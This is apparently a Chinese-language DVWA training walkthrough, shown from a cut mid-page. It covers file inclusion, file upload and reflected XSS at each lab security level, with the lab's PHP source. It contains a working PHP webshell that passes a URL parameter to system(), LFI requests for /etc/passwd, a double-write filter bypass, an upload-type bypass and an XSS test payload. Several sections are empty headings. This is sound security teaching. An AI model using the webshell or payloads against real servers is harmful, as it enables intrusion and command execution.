		<li><a href="https://en.wikipedia.org/wiki/Remote_File_Inclusion" target="_blank">https://en.wikipedia.org/wiki/Remote_File_Inclusion</a></li>
		<li><a href="https://www.owasp.org/index.php/Top_10_2007-A3" target="_blank">https://www.owasp.org/index.php/Top_10_2007-A3</a></li>
	</ul>
</div>

```
伺服器漏洞程式分析
```
<?php 

// The page we wish to display 
$file = $_GET[ 'page' ]; 
//伺服器端對page參數沒有做任何的(輸入驗證)[過濾跟檢查]
?> 
```

### Medium
***
如何避免File inclusion vulnerability??

使用PHP str_replace() 函数過濾掉不該出現的咚咚

伺服器程式分析
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation(輸入驗證)
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```
但是還是可以進行攻擊==>使用雙寫繞過替換規則

```
LFI 攻擊測試==>
http://192.168.2.119/DVWA/vulnerabilities/fi/?page=..//etc/passwd

RFI 攻擊測試==>
http://192.168.2.119/DVWA/vulnerabilities/fi/?page=hthttp://tp://google.com
```


### High
***

>* 嚴格定義include的檔案名稱是file開頭[file1.php, file2.php , file3.php ]

伺服器程式分析
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation(輸入驗證)
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```
使用了fnmatch函數檢查page參數，要求page參數的開頭必須是file，伺服器才會去包含相應的檔

攻擊測試
```
LFI 攻擊測試==>利用file協定
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file:///etc/passwd

比較看看
http://192.168.1.250/DVWA/vulnerabilities/fi/?page=/etc/passwd

RFI 攻擊測試==>無法攻擊
```
### Impossible
***
```
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```
# File Upload（文件上傳）

### Low

webshell程式碼::shell1.php
```
<form action="" method="get">
Command: <input type="text" name="cmd" /><input type="submit" value="submit" />
</form>
Output:<br />
<pre>
<?php 
if (isset($_GET['cmd']))    
(    
system($_GET['cmd'])
) 
?>
</pre>
```

攻擊技術
```
先上傳正常圖片==>看看放在哪一個目錄
http://192.168.1.250/DVWA/vulnerabilities/upload/


再上傳一隻webshell(副檔名是php)
http://192.168.1.250/DVWA/vulnerabilities/upload/../../hackable/uploads/shell1.php

在瀏覽器直接執行遠端程式
http://192.168.1.250/DVWA/hackable/uploads/shell1.php

http://192.168.1.250/DVWA/hackable/uploads/shell1.php?cmd=ifconfig

```

關鍵程式碼解析
```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // Can we move the file to the upload folder? 
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
        // No 
        echo '<pre>Your image was not uploaded.</pre>'; 
    } 
    else { 
        // Yes! 
        echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
    } 
} 

?> 
```
### Medium

中階防禦工法==>檔案類型(jpg,png)檢查與大小限制
```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 

    // Is it an image? 檔案類型(jpg,png)檢查與大小限制
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && 
        ( $uploaded_size < 100000 ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 

```
再次攻擊
```
將webshell先修改副檔名:shell2.php==>shell2.jpg

使用burpsuite攔截再改回名稱:
filename=shell2.jpg==>filename=shell2.php

```


### High

高階防禦工法==>程式碼限制了副檔名的名稱(jpg,jpeg,png)

```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Where are we going to be writing to? 
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; 
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); 

    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) && 
        ( $uploaded_size < 100000 ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Can we move the file to the upload folder? 
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 
        else { 
            // Yes! 
            echo "<pre>{$target_path} succesfully uploaded!</pre>"; 
        } 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

?> 

```

```

```

### Impossible

```
<?php 

if( isset( $_POST[ 'Upload' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 


    // File information 
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; 
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; 
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; 
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

    // Where are we going to be writing to? 
    $target_path   = DVWA_WEB_PAGE_TO_ROOT . 'hackable/uploads/'; 
    //$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-'; 
    $target_file   =  md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 
    $temp_file     = ( ( ini_get( 'upload_tmp_dir' ) == '' ) ? ( sys_get_temp_dir() ) : ( ini_get( 'upload_tmp_dir' ) ) ); 
    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . '.' . $uploaded_ext; 

    // Is it an image? 
    if( ( strtolower( $uploaded_ext ) == 'jpg' || strtolower( $uploaded_ext ) == 'jpeg' || strtolower( $uploaded_ext ) == 'png' ) && 
        ( $uploaded_size < 100000 ) && 
        ( $uploaded_type == 'image/jpeg' || $uploaded_type == 'image/png' ) && 
        getimagesize( $uploaded_tmp ) ) { 

        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 
        if( $uploaded_type == 'image/jpeg' ) { 
            $img = imagecreatefromjpeg( $uploaded_tmp ); 
            imagejpeg( $img, $temp_file, 100); 
        } 
        else { 
            $img = imagecreatefrompng( $uploaded_tmp ); 
            imagepng( $img, $temp_file, 9); 
        } 
        imagedestroy( $img ); 

        // Can we move the file to the web root from the temp folder? 
        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) { 
            // Yes! 
            echo "<pre><a href='${target_path}${target_file}'>${target_file}</a> succesfully uploaded!</pre>"; 
        } 
        else { 
            // No 
            echo '<pre>Your image was not uploaded.</pre>'; 
        } 

        // Delete any temp files 
        if( file_exists( $temp_file ) ) 
            unlink( $temp_file ); 
    } 
    else { 
        // Invalid file 
        echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>'; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?>
```
# XSS（Reflected）（反射型跨站腳本）

### Low
```
步驟一:登錄DVWA

步驟二:選擇安全級別
將dvwa-security-裏面的安全級別調到最低級別

步驟三:選擇XSS(Reflected)題目頁面

步驟四:進行攻擊測試
輸入測試腳本<script>alert(\xss\)</script>點擊提交

==>成果畫面:瀏覽器會彈出“\xss\”
由於此處存在反射性XSS漏洞瀏覽器會彈出“\xss\”
```
### Medium

### High

### Impossible

# XSS（Stored）（存儲型跨站腳本）。

### Low

### Medium

### High

### Impossible

# XSS(DOM)

### Low

### Medium

### High

### Impossible

# CSRF（跨站請求偽造）

### Low

### Medium

### High

### Impossible
